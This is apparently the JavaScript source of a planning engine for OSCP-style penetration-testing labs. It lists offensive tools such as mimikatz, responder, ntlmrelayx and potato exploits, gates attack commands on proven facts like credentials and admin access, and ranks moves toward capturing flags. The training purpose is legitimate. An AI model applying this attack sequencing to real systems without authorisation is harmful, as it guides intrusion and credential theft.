/*!
 * obol engine - pack.js
 * Methodology packs: fact-gated actions loaded from data, plus the planner. An Action is
 * a methodology branch expressed as data: what facts must already be proven (`requires_*`),
 * what a successful run can prove (`produces`, as fact kinds), and - conservatively - what
 * it does *not* prove. The planner asks which actions the current facts unlock, which are
 * blocked and why, and ranks the unlocked ones by the phase/frontier model.
 *
 * Faithful JS port of 
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};
  var P = OBOL.phases;

  var DEFAULT_PACK = 'ad_2026_09';
  // Action packs loaded together by the planner (order is load order only; the planner
  // ranks by each action's priority + phase, not pack order).
  var PACK_NAMES = [
    'ad_2026_09', 'web_2026_09', 'recon_2026_09',
    'linux_privesc_2026_09', 'windows_privesc_2026_09',
    'obol_local_pivot_2026_09', 'obol_flag_hunt_2026_09',
    'findings_checks_2026_09', 'credential_access_2026_09',
    'web_exploit_checks_2026_09', 'database_2026_09',
    'cracking_2026_09', 'pivoting_2026_09', 'shells_2026_09',
  ];

  // ------------------------------------------------------- locus & scope --
  // Two teaching/ranking dimensions every move carries. Both honor an explicit pack field when present
  // (d.locus / d.scope) and otherwise DERIVE from the move's tool + gates, so new moves get a sensible
  // default with zero data churn and the handful of judgment calls can be pinned in the override maps.
  //
  // locus - where you operate relative to the target host, lowest-friction first:
  //   'R' remote/offline from Kali · 'F' one-shot code-exec on the box · 'I' interactive on-host session.
  // The coach prefers R, then F, then I: staying off-host is faster and safer in a timed lab, and the
  // on-host parsers are a safety net for when you are legitimately on the box, never a nudge to go there.
  var LOCUS_REMOTE = { // run from Kali against the target, or offline on Kali - off-host either way
    nmap: 1, rustscan: 1, masscan: 1, dig: 1, nslookup: 1, ffuf: 1, gobuster: 1, feroxbuster: 1, dirb: 1,
    curl: 1, wget: 1, nikto: 1, wpscan: 1, whatweb: 1, 'gobuster-vhost': 1,
    nxc: 1, netexec: 1, crackmapexec: 1, cme: 1, ldapsearch: 1, windapsearch: 1, smbmap: 1, smbclient: 1,
    rpcclient: 1, enum4linux: 1, 'enum4linux-ng': 1, bloodyad: 1, showmount: 1, mount: 1,
    kerbrute: 1, sprayhound: 1, targetedkerberoast: 1, certipy: 1, pywhisker: 1, kinit: 1, 'gpp-decrypt': 1,
    'zerologon-scan': 1, sccmhunter: 1, pygpoabuse: 1,
    ntlmrelayx: 1, responder: 1, coercer: 1, mitm6: 1,
    hydra: 1, medusa: 1, sshpass: 1, ssh: 1, xfreerdp: 1, rdesktop: 1, mysql: 1, 'evil-winrm': 1,
    hashcat: 1, john: 1, openssl: 1, 'bloodhound-python': 1, bloodhound: 1, msfvenom: 1, metasploit: 1,
    nc: 1, ncat: 1, ntpdate: 1,
  };
  var LOCUS_ONHOST_INTERACTIVE = { // need a live session on the box (a .NET/PS tool, a dumper, a PEAS run)
    mimikatz: 1, rubeus: 1, powerview: 1, sharphound: 1, sharpwsus: 1, sharpsccm: 1,
    winpeas: 1, linpeas: 1, 'privesccheck': 1, powerup: 1, seatbelt: 1, 'les.sh': 1,
  };
  var LOCUS_ONHOST_ONESHOT = { // a single command you can fire through limited exec, no interactive shell
    cmd: 1, sh: 1, bash: 1, powershell: 1, pwsh: 1, nltest: 1, klist: 1, whoami: 1, net: 1,
  };
  var LOCUS_ONHOST_FACTS = { // a gate that can only be satisfied once you already hold the box
    'foothold.windows': 1, 'foothold.linux': 1, 'foothold.webshell': 1, 'access.shell': 1,
    'access.system': 1, 'access.admin': 1, 'access.desktop': 1, 'access.root': 1,
  };
  var LOCUS_OVERRIDE = {
    // impacket psexec/wmiexec/etc. and *.py coercers are launched FROM Kali even when they land a shell.
    // These are caught by the impacket-/.py rules below; pin only genuine exceptions here, by move id.
    'windows-old-hives': 'R'
  };
  function isOnhostGateFact(g) {
    return !!(LOCUS_ONHOST_FACTS[g] || /^privesc\.|^blocker\.potato/.test(String(g || '')));
  }
  function deriveLocus(d) {
    if (d.locus) return d.locus;
    if (LOCUS_OVERRIDE[d.id]) return LOCUS_OVERRIDE[d.id];
    var reqAll = d.requires_all || [];
    if (reqAll.indexOf('foothold.linux') >= 0 || reqAll.indexOf('foothold.windows') >= 0) return 'F';
    var tl = (d.tools && d.tools.length ? d.tools : [d.tool || '']).map(function (t) { return String(t || '').toLowerCase(); });
    var anyRemote = tl.some(function (t) { return LOCUS_REMOTE[t] || t.indexOf('impacket-') === 0 || /\.py$/.test(t); });
    if (anyRemote) return 'R';
    if (tl.some(function (t) { return LOCUS_ONHOST_INTERACTIVE[t]; })) return 'I';
    if (tl.some(function (t) { return LOCUS_ONHOST_ONESHOT[t]; })) return 'F';
    // Tool unknown: fall back to the gates. A move that can only run once you hold the box is on-host.
    var gates = reqAll.concat(d.requires_any || []);
    for (var i = 0; i < gates.length; i++) if (isOnhostGateFact(gates[i])) return 'F';
    return 'R'; // default: the remote-first assumption
  }

  // ---- per-COMMAND locus, for the Next Steps Remote/On-Host toggle ---------------------------------
  // This is a DIFFERENT axis from the move-level ranking locus above. The ranking locus asks "where is it
  // launched from" (prefer off-host). This asks the question a learner actually cares about: "does this
  // command put me ON the host?" - because OSCP only counts a flag read from a session on the target. By
  // this axis a tool that hands you a shell (ssh, evil-winrm, rdp, psexec) is ON-HOST even though it is
  // launched from Kali; a tool that only interrogates or acts on the host from Kali (nmap, nxc, hydra) is
  // REMOTE. A command may pin its own locus with d.locus on the command object for the rare odd case.
  var CMD_ONHOST_SESSION = { // hands you an interactive session ON the box
    ssh: 1, sshpass: 1, 'evil-winrm': 1, winrs: 1, telnet: 1, rlogin: 1, rsh: 1,
    xfreerdp: 1, rdesktop: 1, 'xfreerdp3': 1, mstsc: 1,
    psexec: 1, wmiexec: 1, smbexec: 1, atexec: 1, dcomexec: 1,
    'impacket-psexec': 1, 'impacket-wmiexec': 1, 'impacket-smbexec': 1, 'impacket-atexec': 1, 'impacket-dcomexec': 1,
    'psexec.py': 1, 'wmiexec.py': 1, 'smbexec.py': 1,
  };
  var CMD_ONHOST_RUN = { // a command you type once you already hold a session on the box
    cmd: 1, sh: 1, bash: 1, zsh: 1, powershell: 1, pwsh: 1, 'cmd.exe': 1,
    cat: 1, type: 1, find: 1, ls: 1, dir: 1, whoami: 1, id: 1, hostname: 1, ipconfig: 1, ifconfig: 1,
    net: 1, 'net.exe': 1, nltest: 1, klist: 1, reg: 1, schtasks: 1, sc: 1, wmic: 1, dsquery: 1,
    mimikatz: 1, rubeus: 1, 'rubeus.exe': 1, powerview: 1, sharphound: 1, 'sharphound.exe': 1,
    winpeas: 1, 'winpeas.exe': 1, linpeas: 1, 'linpeas.sh': 1, privesccheck: 1, powerup: 1, seatbelt: 1, 'les.sh': 1,
    pspy: 1, pspy64: 1, godpotato: 1, printspoofer: 1, juicypotato: 1, 'comsvcs.dll': 1, rundll32: 1,
    sharpwsus: 1, sharpsccm: 1, lxc: 1, lxd: 1, docker: 1, systemctl: 1, uname: 1, sudo: 1, sudoedit: 1,
    certutil: 1, juicypotatong: 1, accesschk: 1, 'accesschk.exe': 1, icacls: 1, msiexec: 1, fodhelper: 1,
    diskshadow: 1, procmon: 1, screen: 1, tmux: 1, wsl: 1, busctl: 1, ln: 1, unzip: 1, strings: 1,
  };
  function isRemoteKaliCommand(cmd, t) {
    var run = String((cmd && cmd.run) || '').trim();
    if (!run) return false;
    if ((t === 'net' || t === 'net.exe') && /^net\s+rpc\b/i.test(run)) return true;
    if (t === 'sh' || t === 'bash' || t === 'zsh') {
      if (/^(?:sudo\s+)?(?:nxc|netexec|crackmapexec|cme|kerbrute|ldapsearch|impacket-\S+|python3?\s+\S*(?:impacket|set_empty_pw|windows-exploit-suggester)|responder|ntlmrelayx(?:\.py)?|export\s+KRB5CCNAME=|sort\s+-u\b|grep\s+-(?:h|ri|rhoE)\b|jq\s+-r\s+.*\/tmp\/nxc|msfvenom\b|wesng\b|mount\s+-t\s+nfs\s+\{\{target\}\}|curl\b|for\s+\w+\s+in\s+.*;\s*do\s+curl|java\s+-jar\s+(?:ysoserial|jenkins-cli)|cd\s+gitloot\b|svn\s+log\b|ls\s+\/usr\/share\/webshells|cp\s+\/usr\/share\/webshells)/i.test(run)) return true;
      if (/\/etc\/hosts\b|\/etc\/responder\b|base64\s+-d\b|import\s+jwt\b|<\?php\b|<script>|Create TWO accounts/i.test(run)) return true;
      if (/\b(?:nxc|netexec|kerbrute|ldapsearch|impacket-\S+|responder|ntlmrelayx)\b/i.test(run) && /\{\{target\}\}|\{\{dc_ip\}\}|\{\{dc_fqdn\}\}/.test(run)) return true;
    }
    return false;
  }
  // on-host if the command (or its tool) pins it, or its tool grants / runs within a session; else remote.
  function commandLocus(cmd) {
    if (!cmd) return 'remote';
    if (cmd.locus === 'onhost' || cmd.locus === 'remote') return cmd.locus;
    var t = String((cmd.tool || cmd.tools && cmd.tools[0] || '')).toLowerCase();
    if (isRemoteKaliCommand(cmd, t)) return 'remote';
    if (CMD_ONHOST_SESSION[t] || CMD_ONHOST_RUN[t]) return 'onhost';
    return 'remote';
  }
  // Authentication context uses where the command is entered, independently of
  // the UI posture above. A remote session launcher still needs remote proof.
  function commandExecutionLocus(cmd) {
    if (!cmd) return 'remote';
    if (cmd.executionLocus === 'onhost' || cmd.executionLocus === 'remote') return cmd.executionLocus;
    if (cmd.locus === 'remote') return 'remote';
    var t = String((cmd.tool || cmd.tools && cmd.tools[0] || '')).toLowerCase();
    if (isRemoteKaliCommand(cmd, t)) return 'remote';
    return CMD_ONHOST_RUN[t] ? 'onhost' : 'remote';
  }
  function commandIsOnHost(cmd) { return commandLocus(cmd) === 'onhost'; }
  // A move's command loci at a glance: does it offer remote commands, on-host commands, or both? The
  // Remote/On-Host toggle only appears when a move genuinely spans both eligible, plausible commands.
  function moveCommandLoci(move, facts) {
    var r = false, h = false, cs = (move && move.commands) || [];
    for (var i = 0; i < cs.length; i++) {
      if (commandSettled(cs[i], facts)) continue;
      if (facts && facts.forAction && move && typeof move.eligible === 'function' && !move.eligible(facts.forAction(move, cs[i]))) continue;
      if (!commandIsEligible(cs[i], facts, move)) continue;
      if (commandIsOnHost(cs[i])) h = true; else r = true;
      if (r && h) break;
    }
    return { remote: r, onhost: h, both: r && h };
  }
  // The toggle's default side: Remote everywhere (off-host is faster and safer) EXCEPT a flag-capture move,
  // which must default On-Host because a remote flag read scores zero on the exam.
  var OBJECTIVE_FLAG_RE = /^objective\.(flag|local_flag|root_flag)$/;
  function defaultCommandLocus(move, facts) {
    // A recovered credential can be tested by a remote proof attempt before an
    // elevated session exists. Show that attempt first when no on-host launcher is open.
    if (facts && move && move.credential_probe) {
      var probeFacts2 = facts.forAction ? facts.forAction(move, (move.commands || [])[0]) : facts;
      var hasInteractiveShellPort = probeFacts2.has('winrm.reachable') || probeFacts2.has('port:5985') || probeFacts2.has('rdp.reachable') || probeFacts2.has('port:3389');
      if (!probeFacts2.has('access.admin') && !probeFacts2.has('access.system') && !hasInteractiveShellPort && credentialProbeAllowed(move, probeFacts2)) return 'remote';
    }
    var prod = (move && move.produces) || [];
    var isShellOrFlagMove = !!(move && (move.transition === 'foothold_win' || move.id === 'win-interactive-shell'));
    for (var i = 0; i < prod.length; i++) {
      if (OBJECTIVE_FLAG_RE.test(prod[i])) { isShellOrFlagMove = true; break; }
    }
    if (isShellOrFlagMove) {
      var hasSessionOrLauncher = !facts || (
        facts.has('foothold.linux') || facts.has('access.shell') || facts.has('access.admin_shell') ||
        facts.has('access.desktop') || facts.has('access.system') || facts.has('access.root') ||
        ((move.commands || []).some(function (c) {
          var t = String((c && (c.tool || (c.tools && c.tools[0]))) || '').toLowerCase();
          if (!CMD_ONHOST_SESSION[t] || commandLocus(c, move) !== 'onhost') return false;
          var cf = facts.forAction ? facts.forAction(move, c) : facts;
          if ((move.eligible && !move.eligible(cf)) || !commandIsEligible(c, cf, move)) return false;
          if (root.OBOL && root.OBOL.command && root.OBOL.command.commandPortFeasible) {
            if (root.OBOL.command.commandPortFeasible(c, cf).feasible === false) return false;
          }
          return true;
        }))
      );
      if (hasSessionOrLauncher) return 'onhost';
    }
    var loci = moveCommandLoci(move, facts);
    if (loci.onhost && !loci.remote) return 'onhost';
    if (loci.remote && !loci.onhost) return 'remote';
    return 'remote';
  }

  // ---- house toolkit preference ----------------------------------------------------------------
  // NetExec (nxc) is the house tool for the SMB/LDAP/WinRM/RDP/MSSQL/FTP surface. When a move offers the
  // same job through nxc AND an overlapping legacy tool (smbmap, enum4linux(-ng), rpcclient, smbclient),
  // the nxc command is the default shown, and among nxc commands a SWITCHLESS probe (connect + auth, no
  // action switch) leads so "do I even have anonymous/credentialed access?" is answered before the heavy
  // enumeration runs. This is ONE global rule expressed as tool-class DATA (the same shape as LOCUS_REMOTE),
  // applied as a tie-break and a default-pick, never a per-move hand-tuned rank.
  var PREFERRED_TOOLKIT = { nxc: 1, netexec: 1, crackmapexec: 1, cme: 1, 'bloodhound-python': 1 };
  function commandTool(cmd) {
    var t = String((cmd && (cmd.tool || (cmd.tools && cmd.tools[0]))) || '').toLowerCase();
    if (t) return t;
    var m = String((cmd && cmd.run) || '').trim().match(/^(\S+)/);
    return m ? m[1].toLowerCase() : '';
  }
  function commandToolkitRank(cmd) { return PREFERRED_TOOLKIT[commandTool(cmd)] ? 0 : 1; }
  // nxc flags that only connect/authenticate (not an action). A command whose only flags are these is a
  // bare probe. Everything else after the target (--shares, --users, --rid-brute, -M <module>, -x, …) is an
  // action, so the command is NOT a switchless probe.
  var NXC_CONN_FLAGS = { '-u': 1, '-p': 1, '-d': 1, '-H': 1, '-k': 1, '--port': 1, '--local-auth': 1,
    '--hashes': 1, '--aesKey': 1, '--domain': 1, '--kdcHost': 1, '--no-pass': 1 };
  function isSwitchlessProbe(cmd) {
    if (commandToolkitRank(cmd) !== 0) return false;
    var toks = String((cmd && cmd.run) || '').trim().split(/\s+/);
    for (var i = 3; i < toks.length; i++) {   // 0=nxc 1=proto 2=target; scan the remainder
      var t = toks[i];
      if (t.charAt(0) !== '-') continue;       // a value (e.g. '' after -u) or a bare token, not a flag
      if (!NXC_CONN_FLAGS[t]) return false;    // a real action flag or module -> not a bare probe
    }
    return true;
  }
  // A command can declare it is answered once a fact exists (settled_by: [kind,…]), so a one-shot probe
  // drops out of the move after it has done its job: the switchless null-session probe disappears once
  // smb.null_session / smb.guest_session is proven, rather than nagging you to re-run it every render.
  function commandSettled(cmd, facts) {
    if (!facts || !cmd) return false;
    var sb = cmd.settled_by || cmd.settledBy; if (!sb || !sb.length) return false;
    for (var i = 0; i < sb.length; i++) {
      var s = sb[i];
      if (s === 'access.admin_shell') {
        var hasAdminShell = (facts.values('winrm.authenticated') || []).some(function (v) {
          return v && v.tool === 'evil-winrm' && (v.admin || /^administrator$/i.test(String(v.user || '')));
        }) || (facts.values('access.desktop') || []).some(function (v) {
          return v && (v.admin || /^administrator$/i.test(String(v.user || v.identity || '')) || /^(?:wmiexec|psexec|smbexec|atexec|dcomexec)$/i.test(String(v.session || '')));
        });
        if (hasAdminShell) return true;
        continue;
      }
      if (s === 'ad.gpp_xml') {
        var hasGppXml = (facts.values('config.review') || []).some(function (v) { return v && v.kind === 'gpp_xml'; })
          || (facts.values('credential.candidate') || []).some(function (v) { return v && (v.kind === 'gpp_cpassword' || v.kind === 'gpp_plaintext'); });
        if (hasGppXml) return true;
        continue;
      }
      if (s === 'ad.gpp_cpassword') {
        var hasCpass = (facts.values('credential.candidate') || []).some(function (v) { return v && (v.kind === 'gpp_cpassword' || v.kind === 'gpp_plaintext'); });
        if (hasCpass) return true;
        continue;
      }
      if (s === 'objective.flag_located') {
        var isSessionLauncher = (!!CMD_ONHOST_SESSION[commandTool(cmd)] || sb.indexOf('access.desktop') >= 0 || sb.indexOf('access.shell') >= 0 || sb.indexOf('access.admin_shell') >= 0) && commandLocus(cmd) === 'onhost';
        if (isSessionLauncher) continue;
        var text = (cmd.run || '') + ' ' + (cmd.note || '');
        var isRoot = sb.indexOf('access.admin_shell') >= 0 || /(?:[*\\/.]|flag_path_)root\b|(?:[*\\/.]|flag_path_)proof\b|root\.txt|proof\.txt|root\/proof|Administrator\\+Desktop/i.test(text);
        var isLocal = /(?:[*\\/.]|flag_path_)local\b|user\.txt|local\.txt|\*user\*\.txt|\buser flag\b/i.test(text);
        if (isRoot && !isLocal) {
          var hasRoot = (facts.values('objective.flag_located') || []).some(function (v) { return v && v.slot === 'root' && (!isSessionLauncher || v.on_host !== false); })
            || facts.has('objective.root_flag')
            || (!isSessionLauncher && facts.has('objective.flag_located_root'));
          if (hasRoot) return true;
          continue;
        }
        if (isLocal && !isRoot) {
          var hasLocal = (facts.values('objective.flag_located') || []).some(function (v) { return v && v.slot === 'local' && (!isSessionLauncher || v.on_host !== false); })
            || facts.has('objective.local_flag')
            || (!isSessionLauncher && facts.has('objective.flag_located_local'));
          if (hasLocal) return true;
          continue;
        }
        if (isSessionLauncher) {
          var hasOnHostLoc = (facts.values('objective.flag_located') || []).some(function (v) { return v && v.on_host !== false; });
          if (hasOnHostLoc) return true;
          continue;
        }
      }
      if (s === 'ad.group_joined' && facts.has('ad.attack_paths')) {
        var apVals = facts.values('ad.attack_paths') || [];
        var joinedMap = {};
        (facts.values('ad.group_joined') || []).forEach(function (jv) {
          if (jv && jv.group) joinedMap[String(jv.group).split('@')[0].trim().toLowerCase()] = 1;
        });
        var groupHops = [];
        for (var p = 0; p < apVals.length; p++) {
          var hops = (apVals[p] && apVals[p].path) || [];
          for (var h = 0; h < hops.length; h++) {
            var hop = hops[h];
            if (!hop || /^memberof$/i.test(String(hop.edge || ''))) continue;
            var isGrp = /group/i.test(String(hop.to_kind || '')) || /^add(?:member|self)$/i.test(String(hop.edge || ''));
            if (!isGrp && !hop.to_kind && hop.to && !/^getchanges/i.test(String(hop.edge || ''))) {
              var shortTo = String(hop.to).split('@')[0].trim();
              var domPart = String(hop.to).indexOf('@') >= 0 ? String(hop.to).split('@')[1].trim() : '';
              if (shortTo && (!domPart || shortTo.toLowerCase() !== domPart.toLowerCase()) && shortTo.indexOf('.') < 0) isGrp = true;
            }
            if (isGrp && hop.to) groupHops.push(String(hop.to).split('@')[0].trim().toLowerCase());
          }
          if (groupHops.length || hops.length) break;
        }
        if (groupHops.length > 0) {
          var allJoined = groupHops.every(function (gn) { return !!joinedMap[gn]; });
          if (allJoined) return true;
          continue;
        }
      }
      if (facts.has(s)) return true;
    }
    return false;
  }

  // Evidence-based command gating: a command is ONLY eligible if its prerequisites are justified by facts.
  function commandIsEligible(cmd, facts, action) {
    if (!cmd) return false;
    if (!facts) return true;
    if (action && facts.forAction) facts = facts.forAction(action, cmd);

    if (cmd.requires_admin) {
      var hasAdmin = facts.has('access.admin') || facts.has('access.system')
        || (commandExecutionLocus(cmd) === 'remote' && credentialProbeAllowed(action, facts));
      if (!hasAdmin) return false;
    }
    if (cmd.requires_share) {
      var hasShare = facts.has('smb.content_accessible') || facts.has('smb.readable_share') || facts.has('smb.shares');
      if (!hasShare) return false;
    }
    if (cmd.requires_all && cmd.requires_all.length) {
      for (var a = 0; a < cmd.requires_all.length; a++) {
        if (!facts.has(cmd.requires_all[a])) return false;
      }
    }
    if (cmd.requires_any && cmd.requires_any.length) {
      var anyOk = false;
      for (var y = 0; y < cmd.requires_any.length; y++) {
        if (facts.has(cmd.requires_any[y])) { anyOk = true; break; }
      }
      if (!anyOk) return false;
    }
    if (cmd.requires_port) {
      var reqPorts = Array.isArray(cmd.requires_port) ? cmd.requires_port : [cmd.requires_port];
      var portOk = false;
      for (var p = 0; p < reqPorts.length; p++) {
        if (facts.has('port:' + reqPorts[p])) { portOk = true; break; }
        if (root.OBOL && root.OBOL.command && root.OBOL.command.openPorts) {
          if (root.OBOL.command.openPorts(facts).indexOf(reqPorts[p]) >= 0) { portOk = true; break; }
        }
      }
      if (!portOk) return false;
    }

    // Inherent heuristics: commands requiring admin execution (nxc smb -x, wmiexec, psexec, smbexec)
    var runStr = String(cmd.run || '');
    if ((cmd.tool === 'nxc' && runStr.indexOf('smb ') >= 0 && /\s-[xX]\s/.test(runStr)) || cmd.tool === 'impacket-psexec' || cmd.tool === 'impacket-wmiexec' || cmd.tool === 'impacket-smbexec') {
      var hasAdm = facts.has('access.admin') || facts.has('access.system');
      if (!hasAdm && !(commandExecutionLocus(cmd) === 'remote' && credentialProbeAllowed(action, facts))) return false;
    }
    // Inherent heuristics: hardcoded /Users or --spider Users require evidence of accessible share
    if (runStr.indexOf('/Users') >= 0 || runStr.indexOf('--spider Users') >= 0) {
      var hasSh = facts.has('smb.content_accessible') || facts.has('smb.readable_share') || facts.has('smb.shares');
      if (!hasSh) return false;
    }
    // NetExec's -M gpp_password hardcodes SYSVOL and ignores custom readable shares (e.g. Replication).
    // Once SMB shares have been enumerated, suppress -M gpp_password if SYSVOL is not readable.
    if (/-M\s+gpp_password\b/i.test(runStr) && (facts.has('smb.shares') || facts.has('smb.readable_share'))) {
      var sysvolReadable = (facts.values('smb.readable_share') || []).some(function (v) {
        return v && String(v.name || '').toUpperCase() === 'SYSVOL';
      }) || (facts.values('smb.shares') || []).some(function (v) {
        return ((v && v.shares) || []).some(function (s) {
          return s && String(s.name || '').toUpperCase() === 'SYSVOL' && (s.readable === true || (s.permission && s.permission.indexOf('READ') >= 0));
        });
      });
      if (!sysvolReadable) {
        var isUnauthGpp = /(?:^|\s)-u\s*(?:''|"")(?:\s|$)/i.test(runStr);
        if (isUnauthGpp || (!facts.has('credential.available') && !facts.has('smb.authenticated'))) {
          return false;
        }
        var hasCustomReadable = (facts.values('smb.readable_share') || []).some(function (v) {
          return v && v.name && String(v.name).toUpperCase() !== 'SYSVOL';
        });
        if (hasCustomReadable) return false;
      }
    }
    // When unauthenticated SAMR/LSARPC user/RID enumeration is proven denied over null session,
    // suppress remaining unauthenticated SAMR/RID commands until a credential is available.
    if (facts.has('blocker.samr_null_denied') && !facts.has('credential.available') && !facts.has('smb.authenticated')) {
      var isUnauthSamrCmd = ((/(?:^|\s)-(?:u|U)\s*(?:''|""|%)(?:\s|$)|\blookupsid(?:\.py)?\s+(?:guest|anonymous)@/i.test(runStr))
        && (/--rid-brute|--users|\benumdomusers\b|\blookupsid/i.test(runStr)))
        || /^\s*enum4linux(?:-ng)?\s+-(?:U|A|a)\b/i.test(runStr);
      if (isUnauthSamrCmd) return false;
    }
    // In-session on-host commands (cmd, powershell, sh, Rubeus, SharpHound, etc.) require an established
    // on-host session or administrative execution rights whenever the move is a flag-hunt move or offers
    // remote alternatives. Open network ports (5985/3389/22) alone do not unlock in-session commands before auth.
    if (commandExecutionLocus(cmd) === 'onhost' && cmd.locus !== 'remote') {
      var hasShellOrAdmin = facts.has('foothold.windows') || facts.has('foothold.linux') || facts.has('foothold.webshell')
        || facts.has('access.shell') || facts.has('access.admin_shell') || facts.has('access.desktop')
        || facts.has('winrm.authenticated') || facts.has('rdp.authenticated') || facts.has('ssh.authenticated')
        || facts.has('access.admin') || facts.has('access.system') || facts.has('access.root')
        || credentialProbeAllowed(action, facts);
      if (!hasShellOrAdmin) {
        var actionHasRemoteAlt = !action || isFlagHuntAction(action) || ((action.commands || []).some(function (c) {
          return commandExecutionLocus(c) === 'remote';
        }));
        if (actionHasRemoteAlt) return false;
      }
    }
    if (cmd.local_auth_fallback) {
      if (facts.has('ad.dc_candidate') || facts.has('ad.domain_controller') || facts.has('kerberos.reachable') || facts.has('port:88')) {
        return false;
      }
      var rcLocal = facts._resolvedContext;
      var tDom = String((rcLocal && rcLocal.targetDomain) || '').trim();
      var hasAdDom = (tDom.indexOf('.') > 0 && tDom.toLowerCase() !== 'workgroup')
        || facts.has('ad.domain_known')
        || ((facts.values && facts.values('host.domain')) || []).some(function (v) {
          var dn = String((v && (v.domain || v.name)) || '').trim();
          return dn.indexOf('.') > 0 && dn.toLowerCase() !== 'workgroup';
        });
      if (!hasAdDom) return false;
      var domainAuthRejected = facts.has('blocker.logon_failure');
      if (!domainAuthRejected && rcLocal && rcLocal.engagement && Array.isArray(rcLocal.engagement.activities)) {
        var cId = rcLocal.credentialId;
        var tgtHost = rcLocal.target || '';
        domainAuthRejected = rcLocal.engagement.activities.some(function (act) {
          if (!act || !act.outcome || !act.outcome.conclusive || act.outcome.kind !== 'rejected') return false;
          var actTgt = act.target || (/^host:/.test(act.scope || '') ? act.scope.slice(5) : '');
          if (tgtHost && actTgt && actTgt !== tgtHost) return false;
          var actCmd = String(act.command || act.dispatch || '');
          if (/(?:^|\s)--local-auth\b/i.test(actCmd) || !/\b(?:nxc|netexec|crackmapexec|cme)\s+smb\b/i.test(actCmd)) return false;
          var pc = act.context || (act.outcome && act.outcome.context) || {};
          return !cId || !pc.credentialId || pc.credentialId === cId;
        });
      }
      if (!domainAuthRejected) return false;
    }
    if (action && action.id === 'validate-credential') {
      if (root.OBOL && root.OBOL.command && root.OBOL.command.commandPortFeasible) {
        if (root.OBOL.command.commandPortFeasible(cmd, facts).feasible === false) return false;
      }
      var rcVal = facts._resolvedContext;
      var boundCred = rcVal && rcVal.credential;
      var availVals = (facts.values && facts.values('credential.available')) || [];
      var hasPw = boundCred ? !!boundCred.password : availVals.some(function (v) { return !!(v && (v.password || v.secret)); });
      var hasNt = boundCred ? !!boundCred.nthash : availVals.some(function (v) { return !!(v && (v.nthash || v.hash)); });
      if (boundCred || availVals.length > 0) {
        if (runStr.indexOf('{{nthash}}') >= 0 && runStr.indexOf('{{password}}') < 0 && !hasNt) return false;
        if (runStr.indexOf('{{password}}') >= 0 && !hasPw && !hasNt) return false;
        if (/\b(?:nxc|netexec|crackmapexec|cme)\s+(?:ssh|ftp)\b/i.test(runStr) && !hasPw) return false;
      }
    }

    return true;
  }

  // The default command index for a move at a given locus: among commands matching the locus, not yet
  // settled, and not skipped (skipFn lets the UI exclude commands gated on facts the operator has not
  // earned yet), prefer the house toolkit (nxc), then a switchless probe, then earliest pack order. Falls
  // back to the first locus-matching command (even if settled/gated) so the toggle always has a target.
  function preferredCommandIndex(move, locus, facts, skipFn, triedFn) {
    var cs = (move && move.commands) || [], best = -1, bestTried = true, bestAlt = true, bestRank = 99, bestProbe = false, bestFeasible = false, i;
    var isRootFlagWin = !!(move && move.id === 'flag-hunt-root-windows' && facts && typeof facts.values === 'function');
    var preferDaHash = false, rootPathKnown = false;
    if (isRootFlagWin) {
      var availCreds = facts.values('credential.available') || [];
      var hasAdminHash = facts.has('loot.ntds') || availCreds.some(function (v) {
        return v && (v.nthash || v.hash) && (v.method === 'dcsync' || /^administrator$/i.test(String(v.user || v.username || '')));
      });
      var hasAdminPlain = availCreds.some(function (v) {
        return v && v.password && /^administrator$/i.test(String(v.user || v.username || ''));
      });
      preferDaHash = hasAdminHash && !hasAdminPlain;
      rootPathKnown = (facts.values('objective.flag_located') || []).some(function (v) {
        return v && v.slot === 'root' && v.path;
      });
    }
    for (i = 0; i < cs.length; i++) {
      if (commandLocus(cs[i]) !== locus) continue;
      if (commandSettled(cs[i], facts)) continue;
      if (!commandIsEligible(cs[i], facts, move)) continue;
      if (skipFn && skipFn(cs[i], i)) continue;
      var tried = !!(triedFn && triedFn(cs[i], i));
      var runStr = String(cs[i].run || '');
      var isSweepFallback = isRootFlagWin && rootPathKnown && /for \/d %d/i.test(runStr) && runStr.indexOf('{{flag_path_root}}') < 0;
      var isAlt = !!cs[i].alt || isSweepFallback;
      var portCheck = (OBOL.command && OBOL.command.commandPortFeasible) ? OBOL.command.commandPortFeasible(cs[i], facts) : { feasible: true };
      var feasible = portCheck.feasible !== false;
      var cTool = commandTool(cs[i]);
      var remoteEnabledBoost = (locus === 'onhost' && facts && ((facts.has('host.rdp_enabled') && cTool === 'xfreerdp') || (facts.has('host.winrm_enabled') && cTool === 'evil-winrm')));
      var hasDiscoveredShare = !!(facts && (facts.has('smb.readable_share') || facts.has('smb.shares')));
      var usesResolvedShare = hasDiscoveredShare && runStr.indexOf('{{share}}') >= 0;
      var rank = locus === 'onhost' ? (remoteEnabledBoost ? -1 : (CMD_ONHOST_SESSION[cTool] ? 0 : 1)) : (usesResolvedShare ? 0 : commandToolkitRank(cs[i]));
      if (preferDaHash && runStr.indexOf('{{dahash}}') >= 0) rank -= 0.25;
      var probe = locus !== 'onhost' && rank === 0 && isSwitchlessProbe(cs[i]);
      if (
        best === -1 ||
        (!tried && bestTried) ||
        (tried === bestTried && (
          (feasible && !bestFeasible) ||
          (feasible === bestFeasible && (
            (!isAlt && bestAlt) ||
            (isAlt === bestAlt && (rank < bestRank || (rank === bestRank && probe && !bestProbe)))
          ))
        ))
      ) {
        best = i; bestTried = tried; bestAlt = isAlt; bestRank = rank; bestProbe = probe; bestFeasible = feasible;
      }
    }
    if (best === -1) {
      for (i = 0; i < cs.length; i++) {
        if (commandSettled(cs[i], facts)) continue;
        if (!commandIsEligible(cs[i], facts, move)) continue;
        if (skipFn && skipFn(cs[i], i)) continue;
        return i;
      }
    }
    if (best === -1) for (i = 0; i < cs.length; i++) if (commandLocus(cs[i]) === locus && commandIsEligible(cs[i], facts, move)) return i;
    return best === -1 ? 0 : best;
  }
  // A move's toolkit rank for the across-move tie-break: 0 if any of its commands is a house-toolkit (nxc)
  // command, else 1. Prefers the nxc route only among moves the ranker has already tied on progress+priority.
  function moveToolkitRank(move) {
    var cs = (move && move.commands) || [];
    for (var i = 0; i < cs.length; i++) if (commandToolkitRank(cs[i]) === 0) return 0;
    return 1;
  }

  // scope - where a technique sits in the OSCP syllabus, for a newcomer-safe lens:
  //   'oscp' core exam material · 'oscp+' modern AD past the core · 'beyond' exotic / legacy / edge CVEs.
  // Default is 'oscp'; a move escalates only when its id, tool, or an earned gate fact matches a curated
  // signal. Curated (not auto-derived) because syllabus placement is a judgment call, overridable via d.scope.
